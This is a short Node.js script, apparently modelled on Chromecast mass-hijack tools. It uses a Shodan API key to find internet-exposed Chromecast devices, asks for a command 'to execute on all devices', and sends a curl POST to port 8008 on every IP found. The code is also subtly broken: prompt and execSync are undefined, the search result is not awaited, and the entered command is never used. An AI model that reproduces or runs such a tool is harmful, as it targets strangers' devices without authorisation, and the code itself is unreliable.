const shodan = require('shodan');

const keys = require('path').resolve('./api.txt');
const fs = require('fs');

let SHODAN_API_KEY;

if (fs.existsSync(keys)) {
  SHODAN_API_KEY = fs.readFileSync(keys, 'utf8').trim();
} else {
  SHODAN_API_KEY = prompt('Please enter a valid Shodan.io API Key: ');
  fs.writeFileSync(keys, SHODAN_API_KEY);
}

while (true) {
  const api = new shodan(SHODAN_API_KEY);
  const query = prompt('Use Shodan API to search for affected Chromecast devices? <Y/n>: ').toLowerCase();
  if (query.startsWith('y')) {
    console.log(`\nChecking Shodan.io API Key: ${SHODAN_API_KEY}`);
    const results = api.search('product:chromecast');
    console.log(`API Key Authentication: SUCCESS\nNumber of Chromecast devices: ${results.total}`);
    const command = prompt('Enter a command to execute on all devices: ');
    if (command) {
      for (const result of results.matches) {
        console.log(`Executing "${command}" on ${result.ip_str}`);
        execSync(`curl -X POST -H "Content-Type: application/json" -d '{"type":"PING"}' http://${result.ip_str}:8008/setup/eureka_info`);
      }
    }
  }
}
